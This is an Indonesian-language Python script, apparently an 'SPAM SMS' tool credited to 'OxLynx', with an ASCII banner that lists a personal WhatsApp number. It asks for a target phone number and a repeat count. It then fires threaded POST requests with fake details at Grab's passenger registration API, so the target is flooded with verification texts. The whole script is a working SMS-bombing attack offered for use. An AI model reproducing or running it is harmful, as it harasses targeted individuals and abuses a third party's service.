#!/bin/usr/python

from multiprocessing.pool import ThreadPool
import os, random
from time import sleep as turu
import subprocess as sp
import requests

os.system('clear')
print ("""\033[1;35m _______         ______                          """)
print ("""\033[1;36m __  __ \____  _____  / _____  _________ ____  __ """)
print ("""\033[1;35m _  / / /__  |/_/__  /  __  / / /__  __ \__  |/_/ """)
print ("""\033[1;36m / /_/ / __>  <  _  /____  /_/ / _  / / /__>  <  """)
print ("""\033[1;35m \____/  /_/|_|  /_____/_\__, /  /_/ /_/ /_/|_|  """)
print ("""\033[1;36m                        /____/                   """)
print ("""\033[1;32m """)
print ("""\033[1;31m ||==============================||  \033[1;32m ┈┈┈╱▔▔▔▔▔▔╲┈╭━━━╮┈┈ """)
print ("""\033[1;36m ××       [+] SPAM SMS [+]       ××  \033[1;33m ┈┈▕┈╭━╮╭━╮┈▏┃SMS┃┈┈ """)
print ("""\033[1;37m ||==============================||  \033[1;32m ┈┈▕┈┃╭╯╰╮┃┈▏╰┳━━╯┈┈ """)
print ("""\033[1;33m ★★ Creator  :\033[1;32m OxLynx            ★★  \033[1;33m ┈┈▕┈╰╯╭╮╰╯┈▏┈┃┈┈┈┈┈ """)
print ("""\033[1;31m ||==============================||  \033[1;32m ┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈ """)
print ("""\033[1;33m ★★ Whatsapp :\033[1;32m 085850252221      ★★  \033[1;33m ┈┈▕┈┈┈╰╯┈┈┈▏┈┈┈┈┈┈┈ """)
print ("""\033[1;37m ||==============================||  \033[1;32m ┈┈▕╱╲╱╲╱╲╱╲▏┈┈┈┈┈┈┈ """)
print ("""\033[1;33m ★★ Facebook :\033[1;32m Bagus P           ★★  \033[1;35m ×× WELCOME       ×× """)
print ("""\033[1;31m ||==============================||  \033[1;36m ×× TO MY TOOLS   ×× """)
print ("""\033[1;35m """)
try:
	no = input("\033[1;32m[+] Nomer Target Cuk [62xxx] :\033[1;37m ")
	jum=int(input("\033[1;35m[+] Jumlah : \033[1;37m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("\033[1;37m[?] HASIL! [?]")
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] SUKSES [+]")
		else:
			print("\033[1;31m[-] GAGAL [-]")
	except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print ("\033[1;33m")
print ("\033[1;36m[+] MATURSUWUN SUDAH MENGGUNAKAN TOOLS INI [+]")
print ("\033[1;35m[!] MADIUN |  JAWA TIMUR | INDONESIA [!]")
print ("\033[1;31m")
